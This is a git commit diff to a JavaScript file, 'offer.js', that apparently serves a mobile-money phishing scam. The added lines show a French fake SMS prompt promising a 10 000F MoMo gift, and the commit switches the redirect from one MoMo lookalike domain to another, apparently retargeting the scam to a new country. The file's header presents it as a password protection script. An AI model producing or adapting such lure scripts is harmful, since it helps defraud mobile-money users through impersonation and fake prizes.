588c165cfa45697002e789596c96e02d133cf165
KENNY <examtapz+me@gmail.com>
2025-09-30 07:09:28 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,7 +1,8 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = '10.000F'
-password=prompt('SMS: Félicitations, votre compte MoMo est qualifié pour recevoir le cadeau MoMo de 10 000F pour le Jour de lIndépendance. Veuillez cliquer sur OK pour CONTINUER. ','10.000F');
+password=prompt('SMS: Félicitations, votre compte MoMo est qualifié pour recevoir le cadeau MoMo de 10 000F pour le Jour de Anniversaire. Veuillez cliquer sur OK pour CONTINUER. ','10.000F');
 if (password != '10.000F') {
-location.href='https://momo-ci.4g-data.pro/Offre';
+location.href='https://momo-bn.4g-data.pro/Offre';
 }
+
 
